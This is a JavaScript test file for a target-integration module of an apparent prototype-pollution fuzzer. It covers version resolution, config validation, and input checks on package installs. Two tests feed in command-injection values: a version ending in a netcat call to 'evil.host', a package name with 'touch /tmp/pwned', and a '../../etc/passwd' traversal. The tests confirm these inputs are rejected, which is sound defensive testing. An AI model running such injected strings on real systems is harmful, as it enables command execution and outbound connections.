import { test, describe, before, after } from 'node:test';
import assert from 'node:assert';
import fs from 'node:fs';
import os from 'node:os';
import { TargetIntegration } from '../../src/target-integration/index.js';
import { fileURLToPath } from 'url';
import path from 'path';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

describe('installed-version resolution (guards against known-CVE-as-0day mislabels)', () => {
  // _installedVersion / _isInstalledAtVersion read node_modules/<pkg>/package.json
  // relative to process.cwd(), so drive them from a temp cwd with a fake install.
  let tmp, origCwd;
  before(() => {
    origCwd = process.cwd();
    tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'uopfuzz-ver-'));
    fs.mkdirSync(path.join(tmp, 'node_modules', 'foo'), { recursive: true });
    fs.writeFileSync(path.join(tmp, 'node_modules', 'foo', 'package.json'),
      JSON.stringify({ name: 'foo', version: '1.0.5' }));
    process.chdir(tmp);
  });
  after(() => { process.chdir(origCwd); fs.rmSync(tmp, { recursive: true, force: true }); });

  test('_installedVersion reads the concrete version npm installed', () => {
    const ti = new TargetIntegration({});
    assert.equal(ti._installedVersion('foo'), '1.0.5');
  });

  test('_installedVersion returns null for a package that is not installed', () => {
    const ti = new TargetIntegration({});
    assert.equal(ti._installedVersion('not-there'), null);
  });

  test('_isInstalledAtVersion is exact-match only; a dist-tag never short-circuits', () => {
    const ti = new TargetIntegration({});
    assert.equal(ti._isInstalledAtVersion('foo', '1.0.5'), true);
    assert.equal(ti._isInstalledAtVersion('foo', '1.0.4'), false);
    assert.equal(ti._isInstalledAtVersion('foo', 'latest'), false);
  });
});

describe('TargetIntegration', () => {
  test('should load valid configuration', async () => {
    const targetIntegration = new TargetIntegration({ dryRun: true });
    const configPath = path.join(__dirname, '../../config/targets/pug.yaml');
    
    const config = await targetIntegration.loadConfig(configPath);
    
    assert.strictEqual(config.name, 'pug');
    assert.strictEqual(config.package, 'pug');
    assert.strictEqual(config.version, '3.0.2');
    assert(Array.isArray(config.entryPoints));
    assert(Array.isArray(config.sinks));
    assert(Array.isArray(config.pollutionPoints));
  });

  test('should validate configuration fields', async () => {
    const targetIntegration = new TargetIntegration({ dryRun: true });
    
    const invalidConfig = {
      name: 'test',
      // missing required fields
    };
    
    assert.throws(() => {
      targetIntegration.validateConfig(invalidConfig);
    }, /Missing required config fields/);
  });

  test('should setup target in dry run mode', async () => {
    const targetIntegration = new TargetIntegration({ dryRun: true });
    const config = {
      name: 'test',
      package: 'test-package',
      version: '1.0.0',
      entryPoints: [{ name: 'test', inputType: 'string' }],
      sinks: ['eval'],
      pollutionPoints: ['test']
    };

    const result = await targetIntegration.setupTarget(config);
    
    assert.strictEqual(result.name, 'test');
    assert.strictEqual(result.isDryRun, true);
  });

  test('installPackage rejects shell metacharacters in the version specifier', async () => {
    const ti = new TargetIntegration({ dryRun: true });
    // Validation runs BEFORE the dry-run and on-disk short-circuits, so these
    // must throw instead of being silently accepted.
    await assert.rejects(
      () => ti.installPackage('lodash', '4.17.21 || nc evil.host 9'),
      /Invalid version specifier/
    );
    await assert.rejects(
      () => ti.installPackage('lodash', '*'),
      /Invalid version specifier/
    );
  });

  test('installPackage rejects an invalid package name before any disk/install step', async () => {
    const ti = new TargetIntegration({ dryRun: true });
    await assert.rejects(
      () => ti.installPackage('lodash; touch /tmp/pwned', '1.0.0'),
      /Invalid package name/
    );
    await assert.rejects(
      () => ti.installPackage('../../etc/passwd', '1.0.0'),
      /Invalid package name/
    );
  });
});